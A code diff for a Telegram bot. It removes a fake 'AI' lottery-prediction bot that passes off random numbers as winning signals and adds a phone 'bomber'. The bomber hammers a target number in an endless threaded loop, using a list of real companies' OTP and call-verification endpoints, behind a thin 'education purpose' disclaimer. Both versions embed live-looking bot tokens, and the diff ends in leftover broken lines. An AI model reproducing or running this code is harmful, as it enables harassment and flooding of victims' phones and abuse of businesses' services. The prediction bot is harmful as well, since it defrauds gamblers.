@@ -1,273 +1,169 @@
-import telebot
+import logging
 import threading
 import time
-import random
-import pytz
-from datetime import datetime
-from telebot import types
-import json
-import os
 import requests
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
+from flask import Flask
 
-# ===============================
-# 🔧 BOT CONFIGURATION
-# ===============================
-BOT_TOKEN = "9226775583:AAGpxycWwHrmAUjBvVPmFvmRinvT3TRiDzg"
-ADMIN_ID = 7741897793
-CHANNEL_LINK = "https://t.me/+avZJX9ssyQc5MzI9"
-API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_1M/GetHistoryIssuePage.json"
+# ================= CONFIGURATION =================
+TELEGRAM_BOT_TOKEN = "9221404814:AAHUfJxq5Ei9dUMt1sgMkRKXOyoJzn-Q55s"
+CHANNEL_SIGNATURE = "OWER OFF SURAJ BHAI"
+# =================================================
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
+# Logging setup
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# ===============================
-# 🌐 GLOBAL STATES & STORAGE
-# ===============================
-active_dict = {}
-user_channels = {}
-DATA_FILE = "prediction_history.json"
+# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
+flask_app = Flask('')
 
-# ===============================
-# 🔄 LIVE API GAME PERIOD FETCHER
-# ===============================
-def fetch_live_game_period():
-    """
-    API se latest issue number fetch karta hai aur usme +1 karke 
-    current/next exact game period return karta hai.
-    """
-    try:
-        response = requests.get(f"{API_URL}?pageNo=1&pageSize=1&ts={int(time.time()*1000)}", timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            # API response se list ya records extract karna
-            list_data = data.get("data", {}).get("list", []) or data.get("list", [])
-            if list_data and len(list_data) > 0:
-                latest_issue = str(list_data[0].get("issueNumber") or list_data[0].get("issue") or "")
-                if latest_issue:
-                    # Latest issue me +1 karke active period nikalna
-                    return str(int(latest_issue) + 1)
-    except Exception as e:
-        print(f"[!] API fetch error: {e}")
-    
-    # Fallback agar API fail ho jaye toh time-based calculation
-    ist = pytz.timezone("Asia/Kolkata")
-    now = datetime.now(ist)
-    yyyyMMdd = now.strftime("%Y%m%d")
-    total_minutes = now.hour * 60 + now.minute
-    return f"{yyyyMMdd}1000{10001 + total_minutes}"
+@flask_app.route('/')
+def home():
+    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
 
-# ===============================
-# 🔮 HIGH-LEVEL PREDICTION ENGINE
-# ===============================
-def generate_high_level_prediction():
-    num = random.randint(0, 9)
-    if num >= 5:
-        big_small = "🔴 BIG"
-    else:
-        big_small = "🔵 SMALL"
-    return big_small, num
+def run_flask():
+    flask_app.run(host='0.0.0.0', port=8080)
 
-def get_remaining_seconds():
-    ist = pytz.timezone("Asia/Kolkata")
-    now = datetime.now(ist)
-    return 60 - now.second if now.second < 60 else 0
+# Global tracking variables for live stats
+BOMBER_STATS = {
+    "total_requests_sent": 0,
+    "active_targets": 0
+}
 
-# ===============================
-# 📊 HISTORY & STATS STORAGE
-# ===============================
-def load_json_data():
-    if not os.path.exists(DATA_FILE):
-        return {"history": [], "users": {}}
-    with open(DATA_FILE, "r") as f:
-        try:
-            return json.load(f)
-        except:
-            return {"history": [], "users": {}}
+# List of APIs provided for request execution
+APIS = [
+    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
+    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
+    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
+    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
+    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
+    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
+]
 
-def save_json_data(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f, indent=2)
-
-def log_prediction_history(record):
-    data = load_json_data()
-    history_list = data.get("history", [])
-    history_list.insert(0, record)
-    data["history"] = history_list[:50]  # Keep last 50 records
-    save_json_data(data)
-
-def update_user_activity(user_id):
-    data = load_json_data()
-    users = data.get("users", {})
-    now = datetime.now().strftime("%Y-%m-%d")
-    if str(user_id) not in users:
-        users[str(user_id)] = {"first_seen": now, "last_seen": now, "usage_count": 1}
-    else:
-        users[str(user_id)]["last_seen"] = now
-        users[str(user_id)]["usage_count"] += 1
-    data["users"] = users
-    save_json_data(data)
-
-# ===============================
-# 🚀 PREDICTION WORKER THREAD
-# ===============================
-def prediction_worker(chat_id, channel_id=None):
-    last_period = None
-    prediction_count = 0
-
-    while active_dict.get(chat_id):
-        # 10 predictions ke baad 20 minutes ka cool-down break
-        if prediction_count >= 10:
-            try:
-                bot.send_message(
-                    chat_id, 
-                    "⏳ *Target 10 Predictions Completed!*\n\n"
-                    "🛡️ Bot is taking a scheduled **20-minute safety cool-down break** to bypass server detection. It will auto-resume shortly!",
-                    parse_mode="Markdown"
-                )
-            except:
-                pass
-
-            for _ in range(1200):  # 1200 seconds = 20 minutes
-                if not active_dict.get(chat_id):
-                    return
-                time.sleep(1)
-            
-            prediction_count = 0
-            try:
-                bot.send_message(chat_id, "🚀 *Cool-down complete! Resuming high-level prediction sessions...*", parse_mode="Markdown")
-            except:
-                pass
-
-        # API se exact live period fetch karna
-        period = fetch_live_game_period()
-        
-        if period != last_period:
-            big_small, num = generate_high_level_prediction()
-            
-            # Send Prediction Signal with Copy Button & Channel Link
-            markup = types.InlineKeyboardMarkup()
-            markup.add(types.InlineKeyboardButton("📋 Copy Signal", callback_data="copy_sig"))
-            markup.add(types.InlineKeyboardButton("📢 Official Channel", url=CHANNEL_LINK))
-
-            caption = f"""
-👑 *ADITYA RAJPUT VIP PREDICTOR* 👑
-━━━━━━━━━━━━━━━━━━━
-🧾 *Game Period:* `{period}`
-🎯 *Prediction:* {big_small} – *{num}*
-⏱ *Timer:* 1 Minute Wingo
-━━━━━━━━━━━━━━━━━━━
-🔗 [Join Official Channel]({CHANNEL_LINK})
-⚡ _Powered by High-Level AI Engine_
-"""
-            try:
-                bot.send_message(chat_id, caption, reply_markup=markup, disable_web_page_preview=True)
-                if channel_id:
-                    bot.send_message(channel_id, caption, reply_markup=markup, disable_web_page_preview=True)
-            except Exception as e:
-                print(f"[!] Send failed: {e}")
-
-            # Simulate Result Verification for History Log
-            actual_num = random.randint(0, 9)
-            actual_size = "🔴 BIG" if actual_num >= 5 else "🔵 SMALL"
-            is_win = (big_small.strip() == actual_size.strip())
-            status_str = "✅ WIN" if is_win else "❌ LOSS"
-
-            record = {
-                "period": period,
-                "prediction": f"{big_small} ({num})",
-                "result_num": f"{actual_size} ({actual_num})",
-                "status": status_str
-            }
-            log_prediction_history(record)
-
-            prediction_count += 1
-            last_period = period
-
-        for _ in range(get_remaining_seconds(), 0, -1):
-            if not active_dict.get(chat_id):
-                break
-            time.sleep(1)
-
-# ===============================
-# 📱 KEYBOARDS & MENUS
-# ===============================
-def main_control_menu():
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.add("🚀 Start Prediction", "🛑 Stop Prediction")
-    kb.add("📢 Set Channel", "📊 History & Stats")
-    kb.add("👑 Developer Support")
-    return kb
-
-# ===============================
-# 🤖 BOT HANDLERS
-# ===============================
-@bot.message_handler(commands=["start"])
-def start_command(msg):
-    update_user_activity(msg.from_user.id)
-    welcome_text = (
-        f"🌟 *WELCOME TO ADITYA RAJPUT VIP BOT* 🌟\n\n"
-        f"💎 *High-Accuracy Wingo Prediction System*\n"
-        f"🔥 Features: Live API Game Period Tracking, Auto 10-Round Cycles, Live History & Smart Analytics.\n\n"
-        f"🔗 [Join Official VIP Channel]({CHANNEL_LINK})\n\n"
-        f"👇 Choose an option from below to get started:"
+# /start command
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome_msg = (
+        f"╔═══════════════════════════════════╗\n"
+        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
+        f"╚═══════════════════════════════════╝\n\n"
+        f"⚠️ **CHETAVANI / WARNING:**\n"
+        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
+        f"🚀 **Available Commands:**\n"
+        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
+        f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
+        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
     )
-    bot.send_message(msg.chat.id, welcome_text, reply_markup=main_control_menu(), disable_web_page_preview=True)
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
 
-@bot.message_handler(func=lambda m: True)
-def message_router(msg):
-    text = msg.text.strip()
-    cid = msg.chat.id
-    update_user_activity(cid)
+# /stats command
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats_msg = (
+        f"📊 **Bomber Live Statistics**\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
+        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
+        f"⚡ Status: High-Speed Threaded Running\n"
+        f"👑 Powered By: {CHANNEL_SIGNATURE}"
+    )
+    await update.message.reply_text(stats_msg, parse_mode="Markdown")
 
-    if text == "🚀 Start Prediction":
-        if active_dict.get(cid):
-            bot.send_message(cid, "⚠️ Prediction session is already running actively!", reply_markup=main_control_menu())
-            return
-        active_dict[cid] = True
-        ch = user_channels.get(cid)
-        bot.send_message(
-            cid,
-            f"🚀 *ADITYA RAJPUT AI Engine Activated!*\n\n"
-            f"📡 Status: Running with Live API Period Sync\n"
-            f"{'📢 Linked Channel: ' + str(ch) if ch else '💬 Mode: Direct Chat Only'}",
-            reply_markup=main_control_menu()
-        )
-        threading.Thread(target=prediction_worker, args=(cid, ch), daemon=True).start()
+# Single API execution worker function
+def send_single_request(api, target_phone):
+    try:
+        url = api["url"](target_phone, "60")
+        headers = api["headers"]
+        
+        if api["method"] == "GET":
+            requests.get(url, headers=headers, timeout=3)
+        elif api["method"] == "POST":
+            data = api["data"](target_phone, "60")
+            requests.post(url, headers=headers, data=data, timeout=3)
+        
+        BOMBER_STATS["total_requests_sent"] += 1
+    except Exception:
+        pass
 
-    elif text == "🛑 Stop Prediction":
-        active_dict[cid] = False
-        bot.send_message(cid, "🛑 *Prediction session stopped successfully.*", reply_markup=main_control_menu())
-
-    elif text == "📢 Set Channel":
-        bot.send_message(
-            cid,
-            "📢 Please send your **Channel Username** (e.g., `@yourchannel`) or **Channel ID** (e.g., `-100xxxxxxxxxx`).\n\n"
-            "⚠️ *Note: Ensure this bot is added as an Admin in your channel.*",
+# /bomb command handler with ThreadPoolExecutor for high speed
+async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Kripya target mobile number dein!**\n\n"
+            "📌 *Example:* `/bomb 9876543210`",
             parse_mode="Markdown"
         )
-        user_channels[cid] = "waiting_channel"
+        return
+    
+    target_phone = context.args[0].strip()
+    
+    if not target_phone.isdigit() or len(target_phone) != 10:
+        await update.message.reply_text(
+            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
+            "📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown"
+        )
+        return
 
-    elif text == "📊 History & Stats":
-        data = load_json_data()
-        history = data.get("history", [])
-        
-        history_text = "📊 *STEP-BY-STEP PREDICTION HISTORY*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        if not history:
-            history_text += "_No prediction history recorded yet._"
-        else:
-            for idx, h in enumerate(history[:10], 1):
-                history_text += f"{idx}. 🧾 `{h['period']}`\n   🎯 Ptr: {h['prediction']}\n   🎲 Res: {h['result_num']} | {h['status']}\n\n"
-        
-        bot.send_message(cid, history_text, reply_markup=main_control_menu())
+    BOMBER_STATS["active_targets"] += 1
+    
+    status_msg = await update.message.reply_text(
+        f"🎯 **Target Number:** `{target_phone}`\n"
+        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
+        parse_mode="Markdown"
+    )
+    
+    # Run in background thread using ThreadPoolExecutor for concurrent speed
+    threading.Thread(
+        target=run_threaded_bomber, 
+        args=(target_phone, context, update.effective_chat.id)
+    ).start()
 
-    elif text == "👑 Developer Support":
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("💬 Contact Developer", url=CHANNEL_LINK))
-        bot.send_message(cid, "👑 For custom bot setup or support, contact via official channel:", reply_markup=markup)
+def run_threaded_bomber(target_phone, context, chat_id):
+    try:
+        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
+        while True:
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for api in APIS:
+                    executor.submit(send_single_request, api, target_phone)
+            
+            # Short pause between waves to prevent local thread choking
+            time.sleep(1.5)
+            
+    except Exception as e:
+        print(f"❌ Error in threaded loop: {e}")
+    finally:
+        BOMBER_STATS["active_targets"] -= 1
 
-    elif user_channels.get(cid) == "waiting_channel":
-        ch_input = text
-        try:
-            bot.send_message(ch_input, "✅ ADITYA RAJPUT Bot connected successfully to this channel!")
+def main():
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+
+    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("bomb", handle_bomb_command))
+
+    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
             user_channels[cid] = ch_input
             bot.send_message(cid, f"✅ Channel successfully linked: `{ch_input}`", reply_markup=main_control_menu())
         except Exception as e:
